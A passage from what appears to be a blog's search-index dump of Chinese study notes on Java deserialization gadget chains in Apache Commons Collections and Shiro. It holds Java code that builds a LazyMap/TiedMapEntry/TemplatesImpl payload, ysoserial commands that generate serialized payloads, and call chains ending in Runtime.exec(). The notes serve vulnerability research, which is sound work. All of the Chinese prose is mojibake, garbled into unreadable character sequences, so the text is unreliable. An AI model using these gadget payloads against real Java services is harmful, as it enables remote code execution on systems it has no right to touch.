Object[0]);final Map innerMap = new HashMap();// ÊûÑÈÄ†LazyMapÁöÑfactory‰∏∫ÂâçÈù¢ÁöÑInvokerTransformerfinal Map lazyMap = LazyMap.decorate(innerMap, transformer);// Â°´ÂÖÖTiedMapEntryÁöÑmapÔºàlazyMapÔºâÂíåkeyÔºàTemplatesImplÔºâTiedMapEntry entry = new TiedMapEntry(lazyMap, templates);HashSet map = new HashSet(1);map.add(\"foo\");// ‰∏ãËø∞‰ª£Á†ÅÂ∞ÜentryÂ°´ÂÖÖÂà∞HashSetÁöÑnodeÁöÑkey‰∏äÔºåÂèØ‰ª•‰ΩøÂæóHashSetÂú®putÁöÑÊó∂ÂÄôË∞ÉÁî®TiedMapEntryÁöÑhashCodeÂáΩÊï∞Field f = null;try &#123; f = HashSet.class.getDeclaredField(\"map\");&#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(\"backingMap\");&#125;Reflections.setAccessible(f);HashMap innimpl = null;innimpl = (HashMap) f.get(map);Field f2 = null;try &#123; f2 = HashMap.class.getDeclaredField(\"table\");&#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(\"elementData\");&#125;Reflections.setAccessible(f2);Object[] array = new Object[0];array = (Object[]) f2.get(innimpl);Object node = array[0];if(node == null)&#123; node = array[1];&#125;Field keyField = null;try&#123; keyField = node.getClass().getDeclaredField(\"key\");&#125;catch(Exception e)&#123; keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");&#125;Reflections.setAccessible(keyField);keyField.set(node, entry);// Â∞ÜÊúÄÁªàÁöÑËß¶ÂèëÂáΩÊï∞newTransformerË£ÖËΩΩÂà∞InvokerTransformer‰∏äReflections.setFieldValue(transformer, \"iMethodName\", \"newTransformer\");return map; ËøôÈáå‰∏çÂØπÊ∫êÁ†ÅËøõË°åËÆ≤Ëß£‰∫ÜÔºåÈÉΩÂÜôÂú®‰∫ÜÊ≥®ÈáäÈáå„ÄÇ ËøôÈáåÊï¥ÁêÜ‰∏Ä‰∏ãËøôÊù°ÈìæÁöÑË∞ÉÁî®ËøáÁ®ã 12345678910java.util.HashSet.readObject()-&gt; java.util.HashMap.put()-&gt; java.util.HashMap.hash() -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() -&gt; org.apache.commons.collections.map.LazyMap.get() -&gt; org.apache.commons.collections.functors.InvokerTransformer.transform() -&gt; java.lang.reflect.Method.invoke() ... templates gadgets ... -&gt; java.lang.Runtime.exec() 0x05 ÊÄªÁªìÂú®ÁªèËøáÂØπCommonsCollectionsÁ≥ªÂàóÁöÑÂà©Áî®ÈìæËøõË°åÂàÜÊûêÂêéÔºåÂú®shiroËøô‰∏™ÈóÆÈ¢ò‰∏äÔºåËøõË°å‰∫ÜÂÆûÊàòÔºåËß£ÂÜ≥‰∫Ütomcat‰∏ãÊó†Ê≥ïÂà©Áî®shiroÂéüÁîüÁöÑcommons-collections:3.2.1Ëøô‰∏™ÈóÆÈ¢ò„ÄÇ ÊúÄÂêéÔºåÂú®ÊúÄËøëÁöÑshiro-721Âà©Áî®‰∏äÔºåËøô‰∏™Âà©Áî®ÈìæÂ∏åÊúõÂèØ‰ª•Â∏ÆÂä©Âà∞Â§ßÂÆ∂ Happy Hacking XD"},{"title":"„Äênotes„ÄëJavaÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéò‰πãCommonsCollections2,4,8","permalink":"http://blog.0kami.cn/2019/11/05/java/study-java-deserialized-commonscollections4/","text":"0x00 ÂâçË®ÄÂâçÈù¢Âá†ÁØáÊñáÁ´†ÔºåÂàÜÊûê‰∫ÜCommonsCollections:3.2.1ÁâàÊú¨‰ª•‰∏ãÂ≠òÂú®ÁöÑÂèçÂ∫èÂàóÂåñÈìæ„ÄÇ‰ªäÂ§©Â∞ÜÁªßÁª≠ÂàÜÊûêCommonsCollections:4.0ÁâàÊú¨Ôºå‰∏ªË¶ÅËÆ≤Ëø∞CommonsCollections2Ôºå4Ôºå8ÁöÑÂà©Áî®ÈìæÊûÑÈÄ†„ÄÇ 0x01 ÂâçÊôØÂõûÈ°æcommons-collections:4.0ÁâàÊú¨ÂÖ∂ÂÆûÂπ∂Ê≤°ÊúâÂÉè3.2.2ÁâàÊú¨ÁöÑ‰øÆÂ§çÊñπÂºè‰∏ÄÊ†∑ÂÅöÊãâÈªëÂ§ÑÁêÜÔºåÊâÄ‰ª•Âú®3.2.1Âèä‰ª•‰∏ãÁöÑÂà©Áî®ÈìæÊîπÊîπËøòÊòØÂèØ‰ª•Áî®ÁöÑ„ÄÇ‰æãÂ¶ÇCommonsCollections5 12final Map&lt;String, String&gt; innerMap = new HashMap();final Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain); Â∞ÜinnerMapÊîπÊàêÈîÆÂÄºÂØπÁöÑÁî≥ÊòéÊñπÂºèÂç≥ÂèØÔºå‰ΩÜÊòØÂ§ßÂÆ∂ÊòØ‰∏çÊòØËøòËÆ∞ÂæóÔºåÈô§‰∫ÜÁî®LazyMapÁöÑÊñπÂºèÔºåCommonsCollections3ÊõæÊèêÂà∞Ëøá‰ΩøÁî®TrAXFilterÁ±ªÂàùÂßãÂåñÁöÑÊñπÂºèÊù•ËΩΩÂÖ•‰ªªÊÑèÁöÑclass bytesÊï∞ÁªÑ„ÄÇ commons-collections:4.0ÁâàÊú¨‰∏ãÁöÑÂà©Áî®ÈìæÔºåÁî®ÁöÑÈÉΩÊòØTemplatesImpl‰Ωú‰∏∫ÊúÄÁªàÁöÑÂëΩ‰ª§ÊâßË°åÁöÑ‰ª£Á†ÅË∞ÉÁî®ÔºåÁî±‰∫éÂâçÈù¢ÂàÜÊûêËøáËøô‰∏™Âà©Áî®ÊñπÂºèÔºåÂêéÊñá‰∏çÂÜçÂ§çËø∞„ÄÇ 0x02 Âà©Áî®ÈìæÂàÜÊûê1. CommonsCollections2,4CommonsCollections2,4ÈÉΩÁî®Âà∞‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªPriorityQueueÁöÑComparatorÊù•Ëß¶ÂèëtransformÂáΩÊï∞Ôºå‰∏§ËÄÖÁöÑÂå∫Âà´Âú®‰∫é‰∏≠Èó¥ÁöÑÊ°•Êé•Áî®ÁöÑ‰∏çÂêåÁöÑTransformerÂØπË±°„ÄÇÂÖàÊù•Áúã‰∏Ä‰∏ãPriorityQueue.readObject Ê°ÜÊ°ÜÈáåÁöÑ‰∏ªË¶ÅÂ∑•‰Ωú‰∏∫ÂèçÂ∫èÂàóÂåñÊÅ¢Â§çËØ•ÂØπË±°ÁöÑÊï∞ÊçÆÔºåÊàë‰ª¨ÈáçÁÇπÂÖ≥Ê≥®heapify() ÁªßÁª≠Ë∑üËøõsiftDown ÂΩìÊàë‰ª¨Âú®ÂÆû‰æãÂåñÂØπË±°Êó∂Êèê‰æõ‰∫ÜcomparatorÔºåÂ∞Ü‰ºöÊù•Âà∞Êàë‰ª¨ÊúÄÁªàËß¶ÂèëcompareÁöÑ‰ΩçÁΩÆÔºåÁúã‰∏Ä‰∏ãsiftDownUsingComparator ËøôÈáåË∞ÉÁî®‰∫ÜÊàë‰ª¨‰º†ÂÖ•ÁöÑcomparatorÔºåÂπ∂Ë∞ÉÁî®ÂÖ∂compareÔºåÂà©Áî®Èìæ‰∏≠‰ΩøÁî®‰∫ÜTransformingComparator,Êù•Áúã‰∏Ä‰∏ãÂÆÉÁöÑcompareÂáΩÊï∞ Ë∞ÉÁî®‰∫ÜÂΩìÂâçÁöÑtransformerÁöÑtransformÂáΩÊï∞ÔºåÁúãÂà∞ËøôÈáåÔºåÂÖ∂ÂÆûÂ∑≤ÁªèÂæàÁÜü‰∫ÜÔºåÂâçÈù¢ÂàÜÊûêÁöÑÂæàÂ§öÂà©Áî®ÈìæÈÉΩË∑ütransformÊúâÂÖ≥ÔºåÂπ∂‰∏î4.0ÁâàÊú¨Âπ∂Ê≤°ÊúâÊãâÈªëÁõ∏ÂÖ≥ÁöÑtransformer„ÄÇÊâÄ‰ª•Êé•‰∏ãÊù•ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Áî®ÂâçÈù¢ÁöÑ‰∏Ä‰∫õÊÄùË∑Ø‰∫Ü„ÄÇ CommonsCollections2 CommonsCollections2Âà©Áî®‰∫ÜInvokerTransformerÁ±ªÁöÑ‰ªªÊÑèÁ±ªÂáΩÊï∞Ë∞ÉÁî®ÁöÑtransformÔºå‰º†ÂÖ•ÊûÑÈÄ†Â•ΩÁöÑtemplates gadgetÂπ∂Ë∞ÉÁî® TemplatesImpl.newTransformer CommonsCollections4 CommonsCollections4ÂêéÁª≠Áî®ÁöÑÊñπÊ≥ïÂêåCommonsCollections3‰∏ÄÊ†∑ÔºåÁî®InstantiateTransformerÊù•Ëß¶ÂèëTrAXFilterÁöÑÂàùÂßãÂåñÔºåÊúÄÁªà‰πüÂ∞ÜË∞ÉÁî®TemplatesImpl.newTransformer Êï¥ÁêÜ‰∏Ä‰∏ãÂà©Áî®Èìæ 12345678910111213141516171819202122CommonsCollection2:PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec()CommonsCollection4:PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; ChainedTransformer.transform() -&gt; InstantiateTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() 2.CommonsCollections8CommonsCollections8ÊòØ‰ªäÂπ¥navalorenzoÊé®ÈÄÅÂà∞ysoserial‰∏äÁöÑÔºå8‰∏é2Ôºå4ÁöÑÂå∫Âà´Âú®‰∫é‰ΩøÁî®‰∫ÜÊñ∞ÁöÑreadObjectËß¶ÂèëÁÇπTreeBag Êù•Áúã‰∏Ä‰∏ãTreeBag.readObject ËøôÈáåÁöÑ‰∏§‰∏™ÂÖ≥ÈîÆÁÇπTreeBagÁöÑÁà∂Á±ªÁöÑdoReadObjectÂáΩÊï∞ÂíåTreeMap. Áúã‰∏Ä‰∏ãdoReadObject ËøôÈáåÂØπ‰º†ÂÖ•ÁöÑTreeMapË∞ÉÁî®‰∫ÜputÂáΩÊï∞ ÁªßÁª≠Ë∑üËøõcompareÂáΩÊï∞ ËøôÈáåÂèàÂõûÂà∞‰∫ÜÁÜüÊÇâÁöÑcomparator.compareÂáΩÊï∞ÔºåÂÖ∂‰∏≠comparatorÂ∞±ÊòØÊàë‰ª¨ÊûÑÈÄ†ÁöÑTransformingComparator ÂêéÁª≠Ë∑üCommonsCollections2Áõ∏ÂêåÔºåÂ∞±‰∏çÂ§çËø∞‰∫Ü„ÄÇ Êï¥ÁêÜ‰∏Ä‰∏ãÂà©Áî®Èìæ 12345678TreeBag.readObject() -&gt; AbstractMapBag.doReadObject() -&gt; TreeMap.put() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() 3. commons-collections:4.1Âèä‰ª•‰∏äÁöÑÊîπÂèòÂâçÈù¢ÊèêÂà∞ÁöÑCommonsCollections2,4,8ÔºåÈÉΩÊòØÂú®commons-collections:4.0ÁâàÊú¨‰∏ãÊâçÂèØ‰ª•‰ΩøÁî®ÁöÑ„ÄÇËøôÈáåÊàë‰ª¨Êù•ÁúãÁúã‰∏∫‰ªÄ‰πàÂú®4.1Âèä‰ª•‰∏äÁâàÊú¨Êó†Ê≥ïÂà©Áî®ÔºÅ ÂâçÈù¢Êàë‰ª¨Áî®Âà∞‰∫ÜInvokerTransformerÂíåInstantiateTransformer‰Ωú‰∏∫‰∏≠ËΩ¨ÔºåÂæàÁúüÂÆûÔºå4.1ÁâàÊú¨Ëøô‰∏§‰∏™Á±ªÈÉΩÊ≤°ÊúâÂÆûÁé∞SerializableÊé•Âè£ÔºåÂØºËá¥Êàë‰ª¨Âú®Â∫èÂàóÂåñÊó∂Â∞±Êó†Ê≥ïÂà©Áî®Ëøô‰∏§‰∏™Á±ª„ÄÇemmmmmÔºåÁõ¥Êé•Âπ≤Êéâ‰∫Ü‰∏äÈù¢ÁöÑ2Ôºå4Ôºå8„ÄÇ Ëøô‰∏™ÊîπÂèòÊÑèÂë≥ÁùÄÊàë‰ª¨ÈúÄË¶Å‰ªéÂÖ∂‰ªñÂèØÊìç‰ΩúÂç±Èô©ÊñπÊ≥ïÁöÑÂØπË±°‰∫Ü„ÄÇ 0x03 ÊÄªÁªìÂàÜÊûêÂÆåysoserialÈáåÁöÑcommons-collectionsÁ≥ªÂàóÁöÑpayloadsÔºåÊàë‰ª¨ÂèØ‰ª•ÁÆÄÂçïÊÄªÁªì‰∏Ä‰∏ãJavaÁöÑÂèçÂ∫èÂàóÂåñÊåñÊéòÊÄùË∑ØÔºà‰∏çÊ∂âÂèäÊäÄÊúØÁÇπÔºå‰∏™‰∫∫ÁöÑ‰∏Ä‰∫õÊÉ≥Ê≥ïÔºâ„ÄÇ 1. ÊúÄÁªàÁöÑÂà©Áî®ÊïàÊûúÂú®Âà©Áî®ÈìæÊûÑÈÄ†‰∏≠ÔºåÊàë‰ª¨ËÇØÂÆöÂ∏åÊúõÊúÄÁªàÂèØ‰ª•ËææÂà∞‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊàñËÄÖÊòØ‰ªªÊÑè‰ª£Á†ÅÊâßË°åÁöÑÊïàÊûúÔºåËøôÊ†∑‰ºö‰ΩøÂæóÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂ®ÅÂäõÊúÄÂ§ßÂåñ„ÄÇÊâÄ‰ª•Êàë‰ª¨ÂæàÂºÄÂøÉËÉΩÁúãÂà∞InvokerTransformerÁöÑtransformÂáΩÊï∞Ôºå‰ªñÂà©Áî®ÂèçÂ∞ÑÊú∫Âà∂Êù•Ë∞ÉÁî®‰ªªÊÑèÁöÑ‰ª£Á†ÅÔºå‰πüÊÑèÂë≥ÁùÄÊàë‰ª¨ËÉΩÊéßÂà∂‰ªªÊÑèÁ±ªÁöÑË∞ÉÁî®ÊâßË°å„ÄÇ‰ΩÜÊòØÂú®ÂÆûÈôÖÁöÑÊåñÊéò‰∏≠ÔºåÈô§‰∫ÜÂØπÂèçÂ∞ÑÊú∫Âà∂ÁöÑÊåñÊéòÂíådefineClassÁ±ªÂûãÁöÑÊåñÊéòÔºåÊàë‰ª¨‰πüÂ∫îËØ•Ê≥®ÊÑèÂà∞ÂÖ∂‰ªñÂèØËÉΩ‰ºöÂ≠òÂú®ÁöÑÂç±Èô©Âà©Áî®ÔºåÂ¶Ç‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•Ôºå‰ªªÊÑèÊñá‰ª∂Âà†Èô§Á≠âÁ≠â„ÄÇ 2. Âà©Áî®ÈìæÊÄª‰ΩìÁöÑ‰∏Ä‰∏™ÊåñÊéòÊÄùË∑ØÊàë‰ª¨Âú®ÂàÜÊûêÂÆåÊâÄÊúâÁöÑCommonsCollectionsÁöÑpayloadsÂæàÂÆπÊòìÂèëÁé∞ÁöÑ‰∏ÄÁÇπÊòØÂæàÂ§öpayloads‚ÄúÊùÇ‰∫§‚ÄùÁªÑÂêà‰∫ÜÂ§ö‰∏™ÂèØÂà©Áî®ÁöÑËäÇÁÇπ„ÄÇÈÇ£‰πàÊàë‰ª¨Âú®ÂÆûÈôÖÁöÑÊåñÊéò‰∏≠ÔºåÊàë‰ª¨ÈúÄË¶ÅÈ¶ñÂÖàËÉΩËé∑Áü•Âì™‰∫õÂ∫ìÊñá‰ª∂ÈáåÊúâÂì™‰∫õÂèØÂà©Áî®ÁöÑËäÇÁÇπÔºåÁÑ∂ÂêéÊ†πÊçÆ‰∏ÄÂÆöÁöÑËßÑÂàôÊù•ËøõË°å‰∏Ä‰∏™ÈìæÊù°ÁöÑËøûÊé•„ÄÇ ÈÇ£‰πàÊù•Áúã‰∏Ä‰∏ãÔºåÂèØÂà©Áî®ÁöÑËäÇÁÇπÊòØ‰ªÄ‰πàÔºü ÂÆûÁé∞‰∫ÜSerializableÊé•Âè£ÔºåÊûö‰∏æÂá∫ÊâÄÊúâÂèØ‰ª•Ë¢´Â∫èÂàóÂåñÁöÑÁ±ª„ÄÇ ËØ•Á±ªÁöÑÁ±ªÂ±ûÊÄßÂÅö‰∫ÜÂáΩÊï∞Ë∞ÉÁî®ÊàñÂáΩÊï∞ÁöÑËøîÂõûÂÄºÔºåÂ¶ÇTreeMap.map.put()ÂíåConstantTransformer.transformÁõ¥Êé•ËøîÂõûiConstantÁ±ªÂ±ûÊÄß„ÄÇÂ¶ÇÊûú‰∏çÂ≠òÂú®‰∏äËø∞ÁöÑÊÉÖÂÜµÔºåÊàë‰ª¨ÂèØ‰ª•ÂøΩÁï•„ÄÇ ÂÆûÁé∞‰∫ÜreadObjectÂáΩÊï∞ÔºåËøôÁßçÊÉÖÂÜµÂèØ‰Ωú‰∏∫Ëµ∑ÂßãÁÇπÔºå‰πüÂèØ‰ª•‰Ωú‰∏∫Ê°•Êé•ÁÇπÔºåÈúÄË¶ÅÂÖ∑‰ΩìÂà§Êñ≠ÂÖ∂‰ª£Á†ÅÁöÑÂÆûÁé∞„ÄÇ ÂÆûÁé∞‰∫ÜinvokeÂáΩÊï∞ÔºåËøôÁßçÊÉÖÂÜµÂèØ‰Ωú‰∏∫Ê°•Êé•ÁÇπÔºåÂà©Áî®‰∫Ü‰ª£ÁêÜÊú∫Âà∂„ÄÇ ‰ªéreadObjectÂáΩÊï∞ÂíåinvokeÂáΩÊï∞ÔºåË°çÁîüÂá∫Êù•ÁöÑÁ±ªÂ±ûÊÄßÂáΩÊï∞Ë∞ÉÁî®ÔºåËøôËæπÂèØËÉΩ‰ºöÂºïÂêëÂÖ∂‰ªñÁöÑÁ±ªÂáΩÊï∞ÔºåÂ¶ÇTreeBag.readObjectÁöÑÂÆûÁé∞ÔºåÂ∞ÜÂºïÂêë‰∏ã‰∏ÄÊ≠•ÁöÑÁà∂Á±ªÂáΩÊï∞doReadObjectÂáΩÊï∞„ÄÇËøôÈáåÂ∞±ÈúÄË¶ÅÂÅö‰∏Ä‰∏™‰∫∫Â∑•ÊàñËÄÖÊòØÈùôÊÄÅÁöÑ‰ª£Á†ÅÂàÜÊûê„ÄÇ Êé•‰∏ãÊù•ÔºåÂÖ≥‰∫éÂèØÂà©Áî®ËäÇÁÇπÁöÑ‰∏≤ËÅîÔºåÂÖ∂ÂÆû‰∏ªË¶Å‰æùËµñ‰∫éÁ¨¨5ÁÇπÁöÑÊåñÊéòÔºåÊàë‰ª¨ÈúÄË¶ÅÊ†πÊçÆÁªèÈ™åÊàñËÄÖÊòØÈùôÊÄÅÁöÑ‰ª£Á†ÅÂàÜÊûêÊù•ÂÅö„ÄÇ Ê†πÊçÆ‰∏äÈù¢ÁöÑ‰∏Ä‰∏™ÂàÜÊûêÔºåÂÖ∂ÂÆûÊàë‰ª¨ÂèØ‰ª•ÂÅöÂà∞‰∏Ä‰∏™Ëá™Âä®ÂåñÁöÑÂà©Áî®ÈìæÂèëÊéòÔºåhttps://github.com/JackOfMostTrades/gadgetinspector Ëøô‰∏™Â∑•ÂÖ∑Â∞±ÊòØ‰∏Ä‰∏™ÂæàÂ•ΩÁöÑÂÆûÁé∞ÔºåÂêéÁª≠Â∞ÜÂØπÂÖ∂ËøõË°å‰∏Ä‰∏™ÂàÜÊûê„ÄÇ ‰ªécommons-collectionsÁöÑÈò≤Êä§Êù•ÁúãÔºåÊàë‰ª¨Ë∂äÊù•Ë∂äÊó†Ê≥ïÂú®Âçï‰∏™Â∫ìÈáåÈù¢ÂÆûÁé∞‰∏Ä‰∏™ÂèØÂà©Áî®ÁöÑÂà©Áî®ÈìæÔºåËøô‰πüÊÑèÂë≥ÁùÄÊàë‰ª¨ÈúÄË¶ÅÂØπ‰∏çÂêåÁöÑÈ°πÁõÆÂÅöÈíàÂØπÊÄßÁöÑÂàÜÊûêÔºåÊâÄ‰ª•gadetinspectorËøô‰∏™Â∑•ÂÖ∑ÁöÑÈáçË¶ÅÊÄßÂ∞±‰∏çË®ÄËÄåÂñª‰∫Ü„ÄÇ‰∏ã‰∏ÄÊ≠•Â∞ÜÈáçÁÇπÂàÜÊûê‰∏Ä‰∏ãËØ•Â∑•ÂÖ∑ÁöÑÂÆûÁé∞„ÄÇ"},{"title":"„Äênotes„ÄëJavaÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéò‰πãCommonsCollections5,6,7,9,10","permalink":"http://blog.0kami.cn/2019/10/31/java/study-java-deserialized-commonscollections3-others/","text":"0x00 ÂâçË®ÄÊú¨ÊñáÁªßÁª≠ÂàÜÊûêCommonsCollectionsÁöÑÁõ∏ÂÖ≥ÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÔºåËøôÊ¨°‰∏ªË¶ÅÂàÜÊûêCommonsCollections5,6,7Ôºå‰ª•ÂèäÊàëÊâæÁöÑ‰∏Ä‰∏™Êñ∞Âà©Áî®ÈìæÔºåËøôÈáåÊöÇ‰∏îÂ∞ÜÂÖ∂Áß∞‰∏∫10. 0x01 ÁéØÂ¢ÉÂáÜÂ§á jdk8Ôºåcommons-collections:3.1 123java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 \"open /System/Applications/Calculator.app\" &gt; commonscollections5.serjava -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 \"open /System/Applications/Calculator.app\" &gt; commonscollections6.serjava -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 \"open /System/Applications/Calculator.app\" &gt; commonscollections7.ser 0x02 Âà©Áî®ÈìæÂàÜÊûê 1. ËÉåÊôØÂõûÈ°æÂâçÈù¢ÊèêÂà∞ËøáCommonsCollections1Âíå3Âú®ÊûÑÈÄ†AnnotationInvocationHandlerÊó∂Áî®Âà∞‰∫ÜOverride.class„ÄÇ‰ΩÜÊòØÂ¶ÇÊûú‰Ω†Âú®jdk8ÁöÑÁéØÂ¢É‰∏ãÂéªËΩΩÂÖ•ÁîüÊàêÁöÑpayloadÔºå‰ºöÂèëÁîüjava.lang.Override missing element entrySetÁöÑÈîôËØØ„ÄÇ Ëøô‰∏™ÈîôËØØÁöÑ‰∫ßÁîüÂéüÂõ†‰∏ªË¶ÅÂú®‰∫éjdk8Êõ¥Êñ∞‰∫ÜAnnotationInvocationHandlerÂèÇËÄÉ jdk8‰∏çÁõ¥Êé•Ë∞ÉÁî®s.defaultReadObjectÊù•Â°´ÂÖÖÂΩìÂâçÁöÑAnnotaionInvocationHandlerÂÆû‰æãÔºåËÄåÈÄâÊã©‰∫ÜÂçïÁã¨Â°´ÂÖÖÊñ∞ÁöÑÂèòÈáè„ÄÇ ËøôÈáåÊàë‰ª¨ÂõûÈ°æ‰∏Ä‰∏ãÔºå1Âíå3ÁöÑpayloadÁöÑËß¶ÂèëÁÇπÊòØLazyMap.getÂáΩÊï∞ÔºåËÄåËß¶ÂèëËøô‰∏™ÂáΩÊï∞ÈúÄË¶Å‰ΩøÂæómemberValues‰∏∫LazyMapÂØπË±° ÊòæÁÑ∂Ôºåjdk8ÁöÑÊìç‰Ωú‰ΩøÂæómemberValuesÂπ∂‰∏çÊòØÊàë‰ª¨ÊûÑÈÄ†Â•ΩÁöÑLazyMapÁ±ªÂûã„ÄÇÂú®Ë∞ÉËØï‰∏≠ÔºåÂèØ‰ª•ÁúãÂà∞Ê≠§Êó∂ÁöÑmemberValues‰∏∫LinkedHashMapÂØπË±°ÔºåËØ•ÂØπË±°Êó†Ê≥ïËé∑ÂæóentrySetÁöÑÂÜÖÂÆπÔºåÊâÄ‰ª•‰ºöÊä•ÂâçÈù¢ÁöÑËøô‰∏™ÈîôËØØ„ÄÇ jdk8‰∏ãCommonsCollections1Âíå3Êó†Ê≥ïÊàêÂäüÂà©Áî®‰∫ÜÔºå‰ΩÜÊòØÂ¶ÇÊûúÊàë‰ª¨ÂèØ‰ª•ÊâæÂà∞‰∏Ä‰∏™Êõø‰ª£AnnotationInvocationHandlerÁöÑÂà©Áî®ÊñπÂºèÂë¢ÔºüËøôÂ∞±ÊòØÊú¨ÊñáË¶ÅËÆ≤ÁöÑCommonsCollections5Ôºå6Ôºå7ÊâÄÂÅöÂá∫ÁöÑÊîπÂèò„ÄÇ 2. ÈáçÊñ∞ÊûÑÈÄ†ÂâçÂçäÈÉ®ÂàÜÂà©Áî®Èìæ‚ÄìCommonsCollections5CommonsCollections5‰∏é1ÁöÑÂå∫Âà´Âú®‰∫éAnnotationInvocationHandlerÔºåÂêéÈÉ®ÂàÜÊòØÁõ∏ÂêåÁöÑÔºåÊâÄ‰ª•ËøôÈáå‰∏çÂàÜÊûêÂêéÈÉ®ÂàÜ„ÄÇ AnnotationInvocationHandlerÂú®ÂâçÈù¢Ëµ∑Âà∞ÁöÑ‰ΩúÁî®ÊòØÊù•Ëß¶ÂèëLazyMap.getÂáΩÊï∞ÔºåÊâÄ‰ª•Êàë‰ª¨Êé•‰∏ãÊù•Â∞±ÊòØË¶ÅÈáçÊñ∞Êâæ‰∏Ä‰∏™ÂèØ‰ª•Ëß¶ÂèëËØ•ÂáΩÊï∞ÁöÑÂØπË±°„ÄÇËøô‰∏™ÂØπË±°Êª°Ë∂≥ Á±ªÂèØÂ∫èÂàóÂåñÔºåÁ±ªÂ±ûÊÄßÊúâ‰∏™ÂèØÊéßÁöÑMapÂØπË±°ÊàñObject ËØ•Á±ªÁöÑÁ±ªÂáΩÊï∞‰∏äÊúâË∞ÉÁî®Ëøô‰∏™Map.getÁöÑÂú∞Êñπ CommonsCollections5Âú®ËøôÈáåÁî®Âà∞‰∫ÜTiedMapEntryÔºåÊù•Áúã‰∏Ä‰∏ã TiedMapEntryÊúâ‰∏Ä‰∏™mapÁ±ªÂ±ûÊÄßÔºå‰∏îÂú®getValueÂ§ÑË∞ÉÁî®‰∫Ümap.getÂáΩÊï∞„ÄÇÂêåÊó∂toString„ÄÅhashCode„ÄÅequalsÂùáË∞ÉÁî®‰∫ÜgetValueÂáΩÊï∞ÔºåËøôÈáåÂÖ≥Ê≥®toStringÂáΩÊï∞„ÄÇ toStringÂáΩÊï∞ÈÄöÂ∏∏Âú®‰∏éÂ≠óÁ¨¶‰∏≤ÊãºÊé•Êó∂Ôºå‰ºöË¢´Ëá™Âä®Ë∞ÉÁî®„ÄÇÈÇ£‰πàÊé•‰∏ãÊù•Êàë‰ª¨ÈúÄË¶ÅÊâæ‰∏Ä‰∏™ÂØπË±°Êª°Ë∂≥ Á±ªÂèØÂ∫èÂàóÂåñÔºåÁ±ªÂ±ûÊÄßÊúâ‰∏™Map.EntryÂØπË±°ÊàñObject ËØ•Á±ª‰ºöËá™Âä®Ë∞ÉÁî®Ëøô‰∏™Á±ªÂ±ûÊÄßÁöÑtoStringÂáΩÊï∞ÊàñÂâçÈù¢ÁöÑÂè¶Â§ñÂá†Áßç ËøôÈáåÈÄâÊã©‰∫ÜBadAttributeValueExpExceptionÂØπË±°Ôºå‰ªñÁöÑreadObjectÂáΩÊï∞‰ºöËá™Âä®Ë∞ÉÁî®Á±ªÂ±ûÊÄßÁöÑtoStringÂáΩÊï∞„ÄÇ ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØËøôÈáåSystem.getSecurityManager‰∏∫Á©∫ÔºåÊç¢Âè•ËØùËØ¥ÔºåÂ∞±ÊòØÂΩìÂâçÁöÑjvmÁéØÂ¢É‰∏çËÉΩÂêØÁî®ÂÆâÂÖ®ÁÆ°ÁêÜÂô®„ÄÇ Êù•Áúã‰∏Ä‰∏ã‰∏ÄÊï¥‰∏™Ë∞ÉÁî®Èìæ 12345BadAttributeValueExpException.readObject() -&gt; valObj.toString() =&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; ÂâçÊñáÊûÑÈÄ†ÁöÑRuntime.getRuntime().exec() 3. ÈáçÊñ∞ÊûÑÈÄ†ÂâçÂçäÈÉ®ÂàÜÂà©Áî®Èìæ‚ÄìCommonsCollections6CommonsCollections6ÊòØÂè¶‰∏ÄÁßçÊõøÊç¢ÊñπÂºèÔºåÂêéÂçäÈÉ®ÂàÜÁöÑÂà©Áî®ÈìæËøòÊòØÊ≤°ÊúâÂèòÔºå‰∏ç‰ΩúÂàÜÊûê„ÄÇ Êàë‰ª¨Âú®2‰∏≠ÊèêÂà∞‰∫ÜÈô§‰∫ÜCommonsCollections5Áî®ÁöÑtoStringÂ§ñÔºåËøòÊúâhashCodeÂíåequalsÂáΩÊï∞‰πüË∞ÉÁî®‰∫ÜgetValueÂáΩÊï∞„ÄÇÈÇ£‰πàÊòØÂê¶Â≠òÂú®Ë∞ÉÁî®Ëøô‰∏§‰∏™ÂáΩÊï∞ÁöÑÂØπË±°ÂáΩÊï∞Âë¢ÔºüÁ≠îÊ°àÊòØËÇØÂÆöÁöÑÔºÅ CommonsCollections6Âà©Áî®‰∫ÜTiedMapEntryÁöÑhashCodeÂáΩÊï∞ÔºåÊù•Ëß¶ÂèëLazyMap.get 